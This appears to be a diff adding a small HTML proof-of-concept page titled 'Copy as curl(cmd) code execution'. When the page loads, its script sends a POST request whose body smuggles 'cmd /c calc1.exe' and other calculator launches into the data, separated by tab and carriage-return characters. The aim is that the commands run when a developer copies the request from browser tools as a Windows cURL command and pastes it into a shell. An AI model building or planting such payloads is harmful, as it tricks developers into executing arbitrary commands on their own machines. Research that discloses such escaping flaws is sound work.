@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Copy as curl(cmd) code execution</title>
+  <style>
+    body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; }
+    form { display: inline-block; text-align: left; background: #f4f4f4; padding: 20px; border-radius: 8px; }
+    input { display: block; width: 100%; margin-bottom: 10px; padding: 8px; }
+    button { width: 100%; padding: 10px; background: blue; color: white; border: none; cursor: pointer; }
+  </style>
+</head>
+<body>
+
+
+
+<script>
+fetch("/copyme", { "credentials": "omit", "headers": { "Accept-Language": "en-US", "Content-Type": "text/plain", }, "body": "query=evil\n\ncmd /c calc1.exe\t\r\t calc2.exe \t calc3.exe \rcalc.exe\rcalc.exe\r calc7.exe \rt\r\t calc2.exe \t calc3.exe \r", "method": "POST", });
+</script>
+
+</body>
+</html>
